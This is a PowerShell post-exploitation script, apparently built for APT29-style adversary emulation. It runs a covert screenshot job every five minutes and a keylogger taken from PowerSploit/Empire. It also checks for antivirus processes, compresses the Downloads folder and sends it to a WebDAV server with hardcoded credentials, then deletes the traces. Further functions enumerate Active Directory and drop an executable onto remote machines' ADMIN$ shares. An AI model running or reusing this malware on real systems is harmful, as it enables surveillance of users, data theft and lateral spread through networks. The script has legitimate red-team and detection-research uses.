<#
PsTools Version in this package: 2.44
#>
function Invoke-ScreenCapture
# https://www.pdq.com/blog/capturing-screenshots-with-powershell-and-net/
{
    Start-Job -Name "Screenshot" -ScriptBlock { 
        Write-Host "`nJobPID`n------`n$PID"
        while($true){
            $RandomFileName = [System.IO.Path]::GetRandomFileName(); 
            $Filepath="$env:USERPROFILE\Downloads\$RandomFileName.bmp"; 
            Add-Type -AssemblyName System.Windows.Forms; 
            Add-type -AssemblyName System.Drawing; 
            $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
            $Width = $Screen.Width; 
            $Height = $Screen.Height; 
            $Left = $Screen.Left; 
            $Top = $Screen.Top; 
            $bitmap = New-Object System.Drawing.Bitmap $Width, $Height; 
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap); 
            $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); 
            $bitmap.Save($Filepath); 
            Start-Sleep -Seconds 300
        } 
    }
}

function View-Job
{
    [CmdletBinding()]
    Param(
        [Parameter(Position=1,Mandatory=$true)]
        $JobName
    )

    $j = Get-Job -Name $JobName
    Receive-Job -Job $j
}

function Keystroke-Check {
    Get-Process | Where-Object { $_.ProcessName -Eq "avp" -or $_.ProcessName -Eq "acs" -or $_.ProcessName -Eq "outpost" -or $_.ProcessName -Eq "mcvsescn" -or $_.ProcessName -Eq "mcods" -or $_.ProcessName -Eq "navapsvc" -or $_.ProcessName -Eq "kav" -or $_.ProcessName -Eq "AvastSvc" -or $_.ProcessName -Eq "AvastUi" -or $_.ProcessName -Eq "nod32krn" -or $_.ProcessName -Eq "nod32" -or $_.ProcessName -Eq "ekern" -or $_.ProcessName -Eq "dwengine" -or $_.ProcessName -Eq "MsMpEng" -or $_.ProcessName -Eq "msseces" -or $_.ProcessName -Eq "ekrn" -or $_.ProcessName -Eq "savservice" -or $_.ProcessName -Eq "scfservice" -or $_.ProcessName -Eq "savadminservice" }
}

function Get-Keystrokes {
<#
.SYNOPSIS
 
    Logs keys pressed, time and the active window (when changed).
    Some modifications for Empire by @harmj0y.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    Modifications: @harmj0y
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.LINK
    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#>
    Start-Job -Name "Keystrokes" -ScriptBlock {
        Write-Host "`nJobPID`n------`n$PID"
        [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

        try
        {
            $ImportDll = [User32]
        }
        catch
        {
            $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
            $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
            $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
            $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

            $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
            $FieldArray = [Reflection.FieldInfo[]] @(
                [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
            )

            $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
            $FieldValueArray = [Object[]] @(
                'GetAsyncKeyState',
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
            $FieldValueArray = [Object[]] @(
                'GetKeyboardState',
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
            $FieldValueArray = [Object[]] @(
                'MapVirtualKey',
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
            $FieldValueArray = [Object[]] @(
                'ToUnicode',
                $False,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
            $FieldValueArray = [Object[]] @(
                'GetForegroundWindow',
                $True,
                $False,
                $True,
                [Runtime.InteropServices.CallingConvention]::Winapi,
                [Runtime.InteropServices.CharSet]::Auto
            )
            $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
            $PInvokeMethod.SetCustomAttribute($CustomAttribute)

            $ImportDll = $TypeBuilder.CreateType()
        }

        $LastWindowTitle = ""
        $i=0
        while ($true) {
            Start-Sleep -Milliseconds 40
            $gotit = ""
            $Outout = ""
            
            for ($char = 1; $char -le 254; $char++) {
                $vkey = $char
                $gotit = $ImportDll::GetAsyncKeyState($vkey)
                
                if ($gotit -eq -32767) {

                    #check for keys not mapped by virtual keyboard
                    $LeftShift    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
                    $RightShift   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
                    $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                    $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000
                    $LeftAlt      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LMenu) -band 0x8000) -eq 0x8000
                    $RightAlt     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RMenu) -band 0x8000) -eq 0x8000
                    $TabKey       = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Tab) -band 0x8000) -eq 0x8000
                    $SpaceBar     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Space) -band 0x8000) -eq 0x8000
                    $DeleteKey    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Delete) -band 0x8000) -eq 0x8000
                    $EnterKey     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Return) -band 0x8000) -eq 0x8000
                    $BackSpaceKey = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Back) -band 0x8000) -eq 0x8000
                    $LeftArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Left) -band 0x8000) -eq 0x8000
                    $RightArrow   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Right) -band 0x8000) -eq 0x8000
                    $UpArrow      = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Up) -band 0x8000) -eq 0x8000
                    $DownArrow    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::Down) -band 0x8000) -eq 0x8000
                    $LeftMouse    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LButton) -band 0x8000) -eq 0x8000
                    $RightMouse   = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RButton) -band 0x8000) -eq 0x8000

                    if ($LeftShift -or $RightShift) {$Outout += '[Shift]'}
                    if ($LeftCtrl  -or $RightCtrl)  {$Outout += '[Ctrl]'}
                    if ($LeftAlt   -or $RightAlt)   {$Outout += '[Alt]'}
                    if ($TabKey)       {$Outout += '[Tab]'}
                    if ($SpaceBar)     {$Outout += '[SpaceBar]'}
                    if ($DeleteKey)    {$Outout += '[Delete]'}
                    if ($EnterKey)     {$Outout += '[Enter]'}
                    if ($BackSpaceKey) {$Outout += '[Backspace]'}
                    if ($LeftArrow)    {$Outout += '[Left Arrow]'}
                    if ($RightArrow)   {$Outout += '[Right Arrow]'}
                    if ($UpArrow)      {$Outout += '[Up Arrow]'}
                    if ($DownArrow)    {$Outout += '[Down Arrow]'}
                    if ($LeftMouse)    {$Outout += '[Left Mouse]'}
                    if ($RightMouse)   {$Outout += '[Right Mouse]'}

                    #check for capslock
                    if ([Console]::CapsLock) {$Outout += '[Caps Lock]'}

                    $scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
                    
                    $kbstate = New-Object Byte[] 256
                    $checkkbstate = $ImportDll::GetKeyboardState($kbstate)
                    
                    $mychar = New-Object -TypeName "System.Text.StringBuilder";
                    $unicode_res = $ImportDll::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                    #get the title of the foreground window
                    $TopWindow = $ImportDll::GetForegroundWindow()
                    $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle
                    
                    if ($unicode_res -gt 0) {
                        if ($WindowTitle -ne $LastWindowTitle){
                            # if the window has changed
                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                            $Outout = "`n`n$WindowTitle - $TimeStamp`n"
                            $LastWindowTitle = $WindowTitle
                        }
                        $Outout += $mychar.ToString()
                        $Outout
                    }
                }
            }
        }
    }
}

function Invoke-Exfil {

    if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershell -Force }

    Write-Host "[*] Compressing all the things in download dir"
    Compress-7Zip -Path "$env:USERPROFILE\Downloads\" -Filter * -Password "lolol" -ArchiveFileName "$env:APPDATA\OfficeSupplies.7z"

    $UserName = "cozy"
    $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = "WebDavShare"
    $uri = "\\192.168.0.4\webdav"

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue # Ensure another PSDrive is not occupying the name WebDavShare
    
    Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host "[*] Copying data to WebDavShare"
    Copy-Item "$env:APPDATA\OfficeSupplies.7z" "WebDavShare:\OfficeSupplies.7z" -Force

    Write-Host "[*] Removing temporary network share"
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Invoke-BeachCleanup
}

function Invoke-BeachCleanup {
    Write-Host "[*] Cleaning up"
    Remove-Item -Path "$env:USERPROFILE\Downloads\*.pfx" -Force
    Remove-Item -Path "$env:USERPROFILE\Downloads\*.bmp" -Force
    Remove-Item -Path "$env:USERPROFILE\Downloads\*.png" -Force
    Remove-Item -Path "$env:APPDATA\OfficeSupplies.7z" -Force
}

function Ad-Search { # (&(objectclass=Base)(Filter=Attr))
    
    [CmdletBinding()]
    Param(
        [Parameter(Position=0,Mandatory=$False)]
        $Base='*',

        [Parameter(Position=1,Mandatory=$False)]
        $Filter='*',

        [Parameter(Position=2,Mandatory=$False)]
        $Attr='*'
    )
    Write-Host "[*] Performing Active Directory Search"
    Write-Host "[*] (&(objectclass=$Base)($Filter=$Attr))"
    
    $strFilter = "(&(objectclass=$Base)($Filter=$Attr))"
    $objDomain = New-Object System.DirectoryServices.DirectoryEntry
    $objSearcher = New-Object System.DirectoryServices.DirectorySearcher
    $objSearcher.SearchRoot = $objDomain
    $objSearcher.PageSize = 1000
    $objSearcher.Filter = $strFilter
    $objSearcher.SearchScope = "Subtree"
    $colProplist = '*'

    foreach ($i in $colPropList){$objSearcher.PropertiesToLoad.Add($i)}

    $colResults = $objSearcher.FindAll()

    foreach ($objResult in $colResults)
    {
        $objResult | Select -Property Path
        # $objItem = $objResult.Properties
        # $objItem.Values
    }
}

function Invoke-SeaDukeStage {
    
    [CmdletBinding()]
    Param(
        [Parameter(Position=0,Mandatory=$True)]
        $ComputerName
    )

    $UserName = "cozy"
    $Password = "MyCozyPassw0rd!" | ConvertTo-SecureString -AsPlainText -Force
    $Creds = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $UserName, $Password

    $WebDavShare = "WebDavShare"
    $uri = "\\192.168.0.4\webdav"

    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue

    Write-Host "[*] Creating a temporary mapped network drive - WebDavShare"
    New-PSDrive -Name $WebDavShare -PSProvider FileSystem -Root $uri -Credential $Creds

    Write-Host "[*] Dropping seadaddy"
    Copy-Item "WebDavShare:\python.exe" "\\$ComputerName\ADMIN$\Temp\python.exe" -Force

    Write-Host "[*] Removing temporary network share"
    Remove-PSDrive $WebDavShare -Force -ErrorAction SilentlyContinue
}
